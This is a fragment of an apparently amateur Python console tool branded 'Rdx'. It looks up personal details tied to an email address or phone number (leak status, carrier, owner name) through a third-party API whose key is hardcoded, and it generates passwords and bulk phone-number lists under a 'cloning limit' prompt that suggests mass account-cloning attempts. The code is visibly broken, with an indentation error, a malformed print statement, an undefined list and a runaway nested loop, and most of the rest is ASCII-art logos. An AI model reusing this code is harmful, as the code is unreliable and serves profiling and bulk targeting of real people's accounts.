	print("\033[1;92m➤\033[1;96m Disposable          : " + str(eml.json() ['disposable']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m DNS Valid           : " + str(eml.json() ['dns_valid']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Fraud Score         : " + str(eml.json() ['fraud_score']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Frequent Complainer : " + str(eml.json() ['frequent_complainer']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Generic             : " + str(eml.json() ['generic']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Honeypot            : " + str(eml.json() ['honeypot']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Leaked              : " + str(eml.json() ['leaked']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Message             : " + str(eml.json() ['message']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Over All Score      : " + str(eml.json() ['overall_score']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Recent Abuse        : " + str(eml.json() ['recent_abuse']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Request ID          : " + str(eml.json() ['request_id']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Sanitized E-mail    : " + str(eml.json() ['sanitized_email']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m SMTP Score          : " + str(eml.json() ['smtp_score']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Spam Trap Score     : " + str(eml.json() ['spam_trap_score']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Success             : " + str(eml.json() ['success']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Suggested Domain    : " + str(eml.json() ['suggested_domain']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Suspect             : " + str(eml.json() ['suspect']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Timed Out           : " + str(eml.json() ['timed_out']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m First Name          : " + str(eml.json() ['first_name']))
	sleep(0.1)
	print()
	print("\033[1;92m[~]\033[1;94m Domain Age")
	print()
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Human      : " + str(eml.json() ['domain_age'] ['human']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m ISO        : " + str(eml.json() ['domain_age'] ['iso']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Time Stamp : " + str(eml.json() ['domain_age'] ['timestamp']))
	sleep(0.1)
	print()
	print("\033[1;92m[~]\033[1;94m First Seen")
	print()
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Human      : " + str(eml.json() ['first_seen'] ['human']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m ISO        : " + str(eml.json() ['first_seen'] ['iso']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Time Stamp : " + str(eml.json() ['first_seen'] ['timestamp']))
	sleep(0.1)
	print()
	print('')
	print('')
	print('\x1b[1;96mIf You Continue Or Exit')
	print('\x1b[1;92m [1] Continue ')
	print('\x1b[1;91m [0] Exit ')
	now = input('\x1b[1;96mSelect :-')
	if now=='1':
		track()
	elif now=='0':
		exit()



############# Phone number information gathering ##############################################

def phonefo():
	print()
	os.system('clear')
	print(logo)
	phone = input('Enter Phone Number :- ')
	phe = requests.get("https://ipqualityscore.com/api/json/phone/pPiATkSdtLn3xgKW7a7HikZeZ4HMNa2R/" + phone )
	print()
	sleep(1)
	print()
	print("\033[1;92m[~]\033[1;96m Phone Number Details are given down below")
	print()
	print("\033[1;92m➤\033[1;96m Target Number  : " + phone )
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Status Code    : " + str(phe.status_code) )
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Valid          : " + str(phe.json() ['valid']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m VOIP           : " + str(phe.json() ['VOIP']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Active         : " + str(phe.json() ['active']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Active Status  : " + str(phe.json() ['active_status']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Carrier        : " + str(phe.json() ['carrier']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m City           : " + str(phe.json() ['city']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Country        : " + str(phe.json() ['country']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Dialing Code   : " + str(phe.json() ['dialing_code']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Do Not Call    : " + str(phe.json() ['do_not_call']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Formatted      : " + str(phe.json() ['formatted']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Fraud Score    : " + str(phe.json() ['fraud_score']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Leaked         : " + str(phe.json() ['leaked']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Line Type      : " + str(phe.json() ['line_type']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Local Format   : " + str(phe.json() ['local_format']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m MCC            : " + str(phe.json() ['mcc']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Name           : " + str(phe.json() ['name']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Prepaid        : " + str(phe.json() ['prepaid']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Recent Abuse   : " + str(phe.json() ['recent_abuse']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Region         : " + str(phe.json() ['region']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Request ID     : " + str(phe.json() ['request_id']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Risky          : " + str(phe.json() ['risky']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m SMS Domain     : " + str(phe.json() ['sms_domain']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m SMS E-mail     : " + str(phe.json() ['sms_email']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Spammer        : " + str(phe.json() ['spammer']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Success        : " + str(phe.json() ['success']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m TimeZone       : " + str(phe.json() ['timezone']))
	sleep(0.1)
	print("\033[1;92m➤\033[1;96m Zip Code       : " + str(phe.json() ['zip_code']))
	sleep(0.1)
	print()
	print('')
	print('')
	print('\x1b[1;96mIf You Continue Or Exit')
	print('\x1b[1;92m [1] Continue ')
	print('\x1b[1;91m [0] Exit ')
	now = input('\x1b[1;96mSelect :-')
	if now=='1':
		track()
	elif now=='0':
		exit()


def genx():
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[1]\x1b[1;92m Generate Strong Passwords Randomly ')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;92m[2]\x1b[1;96m Generate Number Randomly ')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[3]\x1b[1;93m[3]  Back            ')
	time.sleep(0.05)
	print('\x1b[1;97m-•◈•-\x1b[1;97m> \x1b[1;97m[0]\x1b[1;91m[0]  Exit            ')
	time.sleep(0.05)
	gen()

def gen():
	options = input('\n   \033[0;92mCHOOSE OPTION >>>\033[1;37m ')
	if options =='':
		print('\x1b[1;91mFill in correctly')
		genx()
	elif options =='1':
		genpassx()
	elif options =='2':
		gennumx()
	elif options =='3':
		pre()
	elif options =='0':
		exit()
	else:
		pre()


def gennumx():
		num = '0123456789'
	code = input('country code + sim code :- ')
	limit = int(input(f'\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
	for nmbr in range(limit):
		nmp = ''.join(choice(string.digits) for _ in range(7))
		user.append(nmp)
	for a in num:
		for b in num:
			for c in num:
				for d in num:
					for e in num:
						for f in num:
							for g in num:
								for h in num:
									print("\033[1;92Number:- \033[1;96" code+a+b+c+d+e+f+g+h)
	print('')
	print('')
	print('\x1b[1;96mChose An Option')
	print('\x1b[1;92m [1] Continue ')
	print('\x1b[1;91m [0] Exit ')
	now = input('\x1b[1;96mSelect :-')
	if now=='1':
		login()
	elif now=='0':
		exit()



def genpassx():
	os.system("clear")
	print(logo)
	print("\033[1;92m\n \033[1;92m[*]\033[1;96m Password generator launching...")
	sleep(0.7)
	MAX_LEN = int(input(' \033[1;92m[?]\033[1;96m Password length: '))
	cot = int(input(' \033[1;92m[?]\033[1;96m Password count: '))

	print('\033[1;92m\n \033[1;92m[*]\033[1;92mPassword length ' + str(MAX_LEN) + ' Selected')
	print('\033[1;92m \033[1;92m[*]\033[1;92m ' + str(cot) + ' Password will generate.')

	print('\033[1;92m\n \033[1;92m[*]\033[1;96mGenerating.....\n')
	sleep(1.3)
	print('\033[1;92m\n \033[1;92m[*]\033[1;92mFollowing are the generated password.\n')

	sleep(1)

	for i in range(cot):
        
		DIGITS = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
		LOCASE_CHARACTERS = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
		UPCASE_CHARACTERS = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
		SYMBOLS = ['@', '#', '$', '%', '=', ':', '?', '.', '/', '|', '~', '>', '*', '(', ')', '<']
        
		COMBINED_LIST = DIGITS + UPCASE_CHARACTERS + LOCASE_CHARACTERS + SYMBOLS
		rand_digit = random.choice(DIGITS)
		rand_upper = random.choice(UPCASE_CHARACTERS)
		rand_lower = random.choice(LOCASE_CHARACTERS)
		rand_symbol = random.choice(SYMBOLS)
		temp_pass = rand_digit + rand_upper + rand_lower + rand_symbol
        
		for x in range(MAX_LEN - 4):
			temp_pass = temp_pass + random.choice(COMBINED_LIST)
			temp_pass_list = array.array('u', temp_pass)
			random.shuffle(temp_pass_list)
		password = ""
        
		for x in temp_pass_list:
			password = password + x
		print('\033[1;92m>[‎‎ⓇDX-Generated :- ]> \033[1;92m', password)
		sleep(0.1)
	print('')
	print('')
	print('\x1b[1;96mChose An Option')
	print('\x1b[1;92m [1] Continue ')
	print('\x1b[1;91m [0] Exit ')
	now = input('\x1b[1;96mSelect :-')
	if now=='1':
		login()
	elif now=='0':
		exit()



logo =("""
\033[0;96m██████  ██████  ███████ ███    ███ ██ ██    ██ ███    ███ 
\033[0;96m██   ██ ██   ██ ██      ████  ████ ██ ██    ██ ████  ████ 
\033[0;96m██████  ██████  █████   ██ ████ ██ ██ ██    ██ ██ ████ ██ 
\033[0;96m██      ██   ██ ██      ██  ██  ██ ██ ██    ██ ██  ██  ██ 
\033[0;96m██      ██   ██ ███████ ██      ██ ██  ██████  ██      ██ 
\033[1;92m==================================================== """) 

logo1 =("""
\033[0;92m██████╗ ██████╗ ██╗  ██╗              ███████╗ ██████╗ 
\033[0;92m██╔══██╗██╔══██╗╚██╗██╔╝              ╚════██║██╔════╝ 
\033[0;92m██████╔╝██║  ██║ ╚███╔╝     █████╗        ██╔╝███████╗ 
\033[0;92m██╔══██╗██║  ██║ ██╔██╗     ╚════╝       ██╔╝ ██╔═══██╗
\033[0;92m██║  ██║██████╔╝██╔╝ ██╗                 ██║  ╚██████╔╝
\033[0;92m╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝                 ╚═╝   ╚═════╝ 
\033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»""")
logo54 =("""
\033[0;92m•~?~ ??????¯??(???)??~?~?~ ??????¯??(???)??~?~?~ ??????¯??
¦-¦++++--+¦¦+++-+-+¦+-+++¦ ¦++++++++¦
¦¦¦¦¦¦¦¦¦¦¦¦++¦¦¦¦¦¦¦¦¦++¦ ¦¦¦¦¦¦+++¦
¦-+++++--+¦¦+++++-+-+-+++¦ ¦++++++++¦
~?~ ??????¯??(???)??~?~?~ ??????¯??(???)??~?~?~ ??????¯??
 \033[1;95m«-----------------\033[1;91mRdx\033[1;95m-----------------»""")
logo2 =("""
\033[0;92m ██████ ██       ██████  ███    ██ ██ ███    ██  ██████  
\033[0;92m██      ██      ██    ██ ████   ██ ██ ████   ██ ██       
\033[0;92m██      ██      ██    ██ ██ ██  ██ ██ ██ ██  ██ ██   ███ 
\033[0;92m██      ██      ██    ██ ██  ██ ██ ██ ██  ██ ██ ██    ██ 
\033[0;92m ██████ ███████  ██████  ██   ████ ██ ██   ████  ██████  
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo3 =("""
\x1b[1;92m    Rdx  Report 


\x1b[1;96m .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
\x1b[1;96m| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
\x1b[1;96m| |  _______     | || |  _________   | || |   ______     | || |     ____     | || |  _______     | || |  _________   | |
\x1b[1;96m| | |_   __ \    | || | |_   ___  |  | || |  |_   __ \   | || |   .'    `.   | || | |_   __ \    | || | |  _   _  |  | |
\x1b[1;96m| |   | |__) |   | || |   | |_  \_|  | || |    | |__) |  | || |  /  .--.  \  | || |   | |__) |   | || | |_/ | | \_|  | |
\x1b[1;96m| |   |  __ /    | || |   |  _|  _   | || |    |  ___/   | || |  | |    | |  | || |   |  __ /    | || |     | |      | |
\x1b[1;96m| |  _| |  \ \_  | || |  _| |___/ |  | || |   _| |_      | || |  \  `--'  /  | || |  _| |  \ \_  | || |    _| |_     | |
\x1b[1;96m| | |____| |___| | || | |_________|  | || |  |_____|     | || |   `.____.'   | || | |____| |___| | || |   |_____|    | |
\x1b[1;96m| |              | || |              | || |              | || |              | || |              | || |              | |
\x1b[1;96m| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
\x1b[1;96m '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 


\x1b[1;92m    Rdx  Report 
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo4 =("""
\x1b[1;92m Rdx  Information 

                                                         
\x1b[1;96m ██████  ███████ ████████  █████  ██ ██      ███████ 
\x1b[1;96m██   ██ ██         ██    ██   ██ ██ ██      ██      
\x1b[1;96m██   ██ █████      ██    ███████ ██ ██      ███████ 
\x1b[1;96m██   ██ ██         ██    ██   ██ ██ ██           ██ 
\x1b[1;96m██████  ███████    ██    ██   ██ ██ ███████ ███████ 
                                                    
                                                    

\x1b[1;92m Rdx  Information 
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo5 =("""
\x1b[1;92m Rdx  Login 

\x1b[1;96m __       ______   _______    ________  ___   __      
\x1b[1;96m/_/\     /_____/\ /______/\  /_______/\/__/\ /__/\    
\x1b[1;96m\:\ \    \:::_ \ \\::::__\/__\__.::._\/\::\_\\  \ \   
\x1b[1;96m \:\ \    \:\ \ \ \\:\ /____/\  \::\ \  \:. `-\  \ \  
\x1b[1;96m  \:\ \____\:\ \ \ \\:\\_  _\/  _\::\ \__\:. _    \ \ 
\x1b[1;96m   \:\/___/\\:\_\ \ \\:\_\ \ \ /__\::\__/\\. \`-\  \ \
\x1b[1;96m    \_____\/ \_____\/ \_____\/ \________\/ \__\/ \__\/
                                                      

\x1b[1;92m Rdx  Login 
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo6 =("""
\033[0;92m██     ██ ███████ ██       ██████  ██████  ███    ███ ███████ 
\033[0;92m██     ██ ██      ██      ██      ██    ██ ████  ████ ██      
\033[0;92m██  █  ██ █████   ██      ██      ██    ██ ██ ████ ██ █████   
\033[0;92m██ ███ ██ ██      ██      ██      ██    ██ ██  ██  ██ ██      
\033[0;92m ███ ███  ███████ ███████  ██████  ██████  ██      ██ ███████ 
\x1b[1;97m«-----------------\x1b[1;97m Rdx \x1b[1;97m-----------------»""")
logo7 =("""
\033[0;92m██████      ██████  
\033[0;92m██   ██     ██   ██ 
\033[0;92m██████      ██   ██ 
\033[0;92m██   ██     ██   ██ 
\033[0;92m██████      ██████  
\x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
logo8 =("""
\x1b[1;91m██╗   ██╗███████╗ █████╗     
\x1b[1;91m██║   ██║██╔════╝██╔══██╗    
\x1b[1;91m██║   ██║███████╗███████║    
\x1b[1;91m██║   ██║╚════██║██╔══██║    
\x1b[1;91m╚██████╔╝███████║██║  ██║    
\x1b[1;91m ╚═════╝ ╚══════╝╚═╝  ╚═╝ 
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo9 =("""
\x1b[1;91m█████████████████████████████████
\x1b[1;91m█▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
\x1b[1;91m█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▄▀▒▒█
\x1b[1;91m█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█
\x1b[1;91m█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒███
\x1b[1;91m█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒███
\x1b[1;91m█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒███
\x1b[1;91m█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒███
\x1b[1;91m█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒███
\x1b[1;91m█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█
\x1b[1;91m█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▄▀▒▒█
\x1b[1;91m█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
\x1b[1;91m█████████████████████████████████
\x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
logo10 =("""
\x1b[1;91m██╗███╗░░██╗██████╗░██╗░█████╗░
\x1b[1;91m██║████╗░██║██╔══██╗██║██╔══██╗
\x1b[1;91m██║██╔██╗██║██║░░██║██║███████║
\x1b[1;91m██║██║╚████║██║░░██║██║██╔══██║
\x1b[1;91m██║██║░╚███║██████╔╝██║██║░░██║
\x1b[1;91m╚═╝╚═╝░░╚══╝╚═════╝░╚═╝╚═╝░░╚═╝
\x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
logo11 =("""
\033[0;91m██████╗ ██████╗  █████╗ ███████╗██╗██╗     
\033[0;91m██╔══██╗██╔══██╗██╔══██╗╚══███╔╝██║██║     
\033[0;91m██████╔╝██████╔╝███████║  ███╔╝ ██║██║     
\033[0;91m██╔══██╗██╔══██╗██╔══██║ ███╔╝  ██║██║     
\033[0;91m██████╔╝██║  ██║██║  ██║███████╗██║███████╗
\033[0;91m╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo12 =("""
\033[0;91m     ██╗ █████╗ ██████╗  █████╗ ███╗   ██╗
\033[0;91m     ██║██╔══██╗██╔══██╗██╔══██╗████╗  ██║
\033[0;91m     ██║███████║██████╔╝███████║██╔██╗ ██║
\033[0;91m██   ██║██╔══██║██╔═══╝ ██╔══██║██║╚██╗██║
\033[0;91m╚█████╔╝██║  ██║██║     ██║  ██║██║ ╚████║
\033[0;91m ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝
\x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
logo13 =("""
\033[0;91m██╗  ██╗ ██████╗ ██████╗ ███████╗ █████╗     
\033[0;91m██║ ██╔╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗    
\033[0;91m█████╔╝ ██║   ██║██████╔╝█████╗  ███████║    
\033[0;91m██╔═██╗ ██║   ██║██╔══██╗██╔══╝  ██╔══██║    
\033[0;91m██║  ██╗╚██████╔╝██║  ██║███████╗██║  ██║    
\033[0;91m╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo14 =("""
\033[0;91m██╗████████╗ █████╗ ██╗  ██╗   ██╗
\033[0;91m██║╚══██╔══╝██╔══██╗██║  ╚██╗ ██╔╝
\033[0;91m██║   ██║   ███████║██║   ╚████╔╝ 
\033[0;91m██║   ██║   ██╔══██║██║    ╚██╔╝  
\033[0;91m██║   ██║   ██║  ██║███████╗██║   
\033[0;91m╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝   
\x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
logo15 =("""
\033[0;91m███████╗██████╗  █████╗ ██╗███╗   ██╗
\033[0;91m██╔════╝██╔══██╗██╔══██╗██║████╗  ██║
\033[0;91m███████╗██████╔╝███████║██║██╔██╗ ██║
\033[0;91m╚════██║██╔═══╝ ██╔══██║██║██║╚██╗██║
\033[0;91m███████║██║     ██║  ██║██║██║ ╚████║
\033[0;91m╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo16 =("""
\033[0;91m██████╗  ██████╗ ██╗      █████╗ ███╗   ██╗██████╗ 
\033[0;91m██╔══██╗██╔═══██╗██║     ██╔══██╗████╗  ██║██╔══██╗
\033[0;91m██████╔╝██║   ██║██║     ███████║██╔██╗ ██║██║  ██║
\033[0;91m██╔═══╝ ██║   ██║██║     ██╔══██║██║╚██╗██║██║  ██║
\033[0;91m██║     ╚██████╔╝███████╗██║  ██║██║ ╚████║██████╔╝
\033[0;91m╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
\x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
logo17 =("""
\033[0;92m████████████████████████████████████████████████
\033[0;92m█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
\033[0;92m█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▄▀▒▒█
\033[0;92m█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█
\033[0;92m█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒███
\033[0;92m█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒███
\033[0;92m█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒█▒▒▄▀▄▀▄▀▄▀▄▀▒▒███
\033[0;92m█▒▒▄▀▒▒▒▒▒▒▒▒▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒█▒▒▄▀▒▒▒▒▒▒▄▀▒▒███
\033[0;92m█▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒███
\033[0;92m█▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▒▒▒▒█
\033[0;92m█▒▒▄▀▒▒█████████▒▒▄▀▒▒██▒▒▄▀▒▒█▒▒▄▀▒▒██▒▒▄▀▄▀▒▒█
\033[0;92m█▒▒▒▒▒▒█████████▒▒▒▒▒▒██▒▒▒▒▒▒█▒▒▒▒▒▒██▒▒▒▒▒▒▒▒█
\033[0;92m████████████████████████████████████████████████
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo18 =("""
\033[0;92m ██╗███╗   ██╗██████╗  ██████╗ ███╗   ██╗ █████╗ ███████╗██╗ █████╗ 
\033[0;92m ██║████╗  ██║██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██║██╔══██╗
\033[0;92m ██║██╔██╗ ██║██║  ██║██║   ██║██╔██╗ ██║███████║███████╗██║███████║
\033[0;92m ██║██║╚██╗██║██║  ██║██║   ██║██║╚██╗██║██╔══██║╚════██║██║██╔══██║
\033[0;92m ██║██║ ╚████║██████╔╝╚██████╔╝██║ ╚████║██║  ██║███████║██║██║  ██║
\033[0;92m ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝
                                                                   
\x1b[1;97m«-----------------\x1b[1;97m Rdx \x1b[1;97m-----------------»""")
logo19 =("""
\033[0;91m ██████╗ ██████╗ ███████╗███████╗ ██████╗███████╗
\033[0;91m██╔════╝ ██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝
\033[0;91m██║  ███╗██████╔╝█████╗  █████╗  ██║     █████╗  
\033[0;91m██║   ██║██╔══██╗██╔══╝  ██╔══╝  ██║     ██╔══╝  
\033[0;91m╚██████╔╝██║  ██║███████╗███████╗╚██████╗███████╗
\033[0;91m ╚═════╝ ╚═╝  ╚═╝╚══════╝╚══════╝ ╚═════╝╚══════╝
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo20 =("""
\033[0;91m █████╗ ██╗   ██╗███████╗████████╗██████╗  █████╗ ██╗     ██╗ █████╗ 
\033[0;91m██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║     ██║██╔══██╗
\033[0;91m███████║██║   ██║███████╗   ██║   ██████╔╝███████║██║     ██║███████║
\033[0;91m██╔══██║██║   ██║╚════██║   ██║   ██╔══██╗██╔══██║██║     ██║██╔══██║
\033[0;91m██║  ██║╚██████╔╝███████║   ██║   ██║  ██║██║  ██║███████╗██║██║  ██║
\033[0;91m╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝
\x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
logo21 =("""
\033[0;91m ██████╗ █████╗ ███╗   ██╗ █████╗ ██████╗  █████╗ 
\033[0;91m██╔════╝██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔══██╗
\033[0;91m██║     ███████║██╔██╗ ██║███████║██║  ██║███████║
\033[0;91m██║     ██╔══██║██║╚██╗██║██╔══██║██║  ██║██╔══██║
\033[0;91m╚██████╗██║  ██║██║ ╚████║██║  ██║██████╔╝██║  ██║
\033[0;91m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo22 =("""
\x1b[1;91m ██████╗██╗  ██╗██╗███╗   ██╗ █████╗ 
\x1b[1;91m██╔════╝██║  ██║██║████╗  ██║██╔══██╗
\x1b[1;91m██║     ███████║██║██╔██╗ ██║███████║
\x1b[1;91m██║     ██╔══██║██║██║╚██╗██║██╔══██║
\x1b[1;91m╚██████╗██║  ██║██║██║ ╚████║██║  ██║
 \x1b[1;91m╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
\x1b[1;97m«-----------------\x1b[1;97m Rdx\x1b[1;97m-----------------»""")
logo23 =("""
\x1b[1;91m██████╗ ███████╗███╗   ██╗    ███╗   ███╗ █████╗ ██████╗ ██╗  ██╗    
\x1b[1;91m██╔══██╗██╔════╝████╗  ██║    ████╗ ████║██╔══██╗██╔══██╗██║ ██╔╝    
\x1b[1;91m██║  ██║█████╗  ██╔██╗ ██║    ██╔████╔██║███████║██████╔╝█████╔╝     
\x1b[1;91m██║  ██║██╔══╝  ██║╚██╗██║    ██║╚██╔╝██║██╔══██║██╔══██╗██╔═██╗     
\x1b[1;91m██████╔╝███████╗██║ ╚████║    ██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██╗    
\x1b[1;91m╚═════╝ ╚══════╝╚═╝  ╚═══╝    ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    
\x1b[1;97m«-----------------\x1b[1;97mRdx\x1b[1;97m-----------------»""")
logo24 =("""
\x1b[1;91m███████╗██████╗  █████╗ ███╗   ██╗ ██████╗███████╗
